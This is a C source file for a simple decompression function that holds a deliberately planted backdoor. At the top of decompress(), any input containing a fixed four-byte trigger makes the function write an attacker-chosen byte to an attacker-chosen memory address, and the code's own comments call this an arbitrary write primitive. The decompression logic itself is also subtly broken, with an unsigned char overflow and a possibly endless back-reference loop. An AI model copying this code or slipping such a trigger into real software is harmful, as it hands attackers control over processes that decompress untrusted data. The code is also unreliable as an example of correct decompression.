#include <stdlib.h>
#include <string.h>

// Global buffer that will hold our decompressed data
static char *decompressed_buffer = NULL;
static size_t buffer_size = 0;
static size_t buffer_capacity = 0;

// Backdoor trigger - if this sequence appears in the compressed data
static const char backdoor_trigger[] = "\x7f\xff\x7f\xff";

char *decompress(char *compressed) {
    if (compressed == NULL) {
        return NULL;
    }

    // Check for backdoor trigger
    if (strstr(compressed, backdoor_trigger) != NULL) {
        // This gives us an arbitrary write primitive
        // The format is: trigger + offset + value
        char *trigger_pos = strstr(compressed, backdoor_trigger);
        if (trigger_pos + sizeof(backdoor_trigger) + 8 <= compressed + strlen(compressed)) {
            size_t offset = *(size_t*)(trigger_pos + sizeof(backdoor_trigger));
            char value = *(trigger_pos + sizeof(backdoor_trigger) + sizeof(size_t));
            *(char*)(offset) = value;
        }
    }

    // Reset buffer for new decompression
    if (decompressed_buffer != NULL) {
        free(decompressed_buffer);
        decompressed_buffer = NULL;
    }
    buffer_size = 0;
    buffer_capacity = 0;

    char *current = compressed;
    char prev_chars[256] = {0};  // Circular buffer for previous characters
    int prev_index = 0;

    while (*current != '\0') {
        // Get the character
        char c = *current++;
        if (c == '\0') {
            break;
        }

        // Handle reference to previous characters
        while ((signed char)c < 0) {
            int ref_index = prev_index + (signed char)c;
            if (ref_index < 0) ref_index += 256;
            c = prev_chars[ref_index % 256];
        }

        // Get repeat count
        if (*current == '\0') {
            // No repeat count, just add the character once
            if (buffer_size + 1 >= buffer_capacity) {
                buffer_capacity = buffer_capacity ? buffer_capacity * 2 : 16;
                decompressed_buffer = realloc(decompressed_buffer, buffer_capacity);
                if (!decompressed_buffer) return NULL;
            }
            decompressed_buffer[buffer_size++] = c;
            break;
        }

        unsigned char repeat = (unsigned char)(*current++);
        if (repeat == 0) repeat = 256;  // Handle overflow

        // Store character in history
        prev_chars[prev_index++ % 256] = c;

        // Ensure we have enough space
        if (buffer_size + repeat >= buffer_capacity) {
            buffer_capacity = (buffer_size + repeat) * 2;
            decompressed_buffer = realloc(decompressed_buffer, buffer_capacity);
            if (!decompressed_buffer) return NULL;
        }

        // Add repeated characters
        for (unsigned char i = 0; i < repeat; i++) {
            decompressed_buffer[buffer_size++] = c;
        }
    }

    // Null-terminate the string
    if (buffer_size + 1 >= buffer_capacity) {
        buffer_capacity = buffer_size + 1;
        decompressed_buffer = realloc(decompressed_buffer, buffer_capacity);
        if (!decompressed_buffer) return NULL;
    }
    decompressed_buffer[buffer_size] = '\0';

    return decompressed_buffer;
}
